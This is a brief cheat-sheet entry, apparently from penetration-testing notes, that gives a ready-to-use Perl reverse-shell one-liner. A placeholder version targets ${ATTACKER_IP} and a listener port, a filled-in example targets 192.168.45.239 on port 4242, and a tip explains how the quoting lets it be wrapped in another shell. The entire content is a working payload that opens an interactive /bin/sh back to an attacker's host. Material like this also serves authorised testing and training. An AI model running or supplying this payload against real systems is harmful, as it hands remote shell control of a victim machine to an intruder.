## Perl Reverse Shell

> Note: single quotes were avoided so that it can be wrapped in `'`${SHELL}`'`

Replace `${ATTACKER_IP}` and `${ATTACKER_LISTENER_PORT}` below:

```
perl -e 'use Socket;$i="${ATTACKER_IP}";$p=${ATTACKER_LISTENER_PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

e.g.

```
perl -e 'use Socket;$i="192.168.45.239";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
